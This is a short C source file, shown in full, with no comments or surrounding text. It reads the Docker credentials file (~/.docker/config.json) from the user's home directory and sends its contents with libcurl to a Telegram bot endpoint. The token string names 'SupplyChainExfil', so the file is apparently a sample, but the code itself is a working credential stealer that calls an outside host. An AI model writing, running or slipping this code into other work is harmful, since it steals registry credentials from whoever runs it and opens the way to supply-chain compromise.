#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
int main(void) {
    const char *home = getenv("HOME");
    char path[512];
    snprintf(path, sizeof path, "%s/.docker/config.json", home ? home : "");
    FILE *f = fopen(path, "r");
    if (!f) return 1;
    char body[16384];
    size_t n = fread(body, 1, sizeof body - 1, f);
    body[n] = 0;
    fclose(f);
    CURL *c = curl_easy_init();
    curl_easy_setopt(c, CURLOPT_URL, "https://api.telegram.org/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage");
    curl_easy_setopt(c, CURLOPT_POSTFIELDS, body);
    curl_easy_perform(c);
    curl_easy_cleanup(c);
    return 0;
}
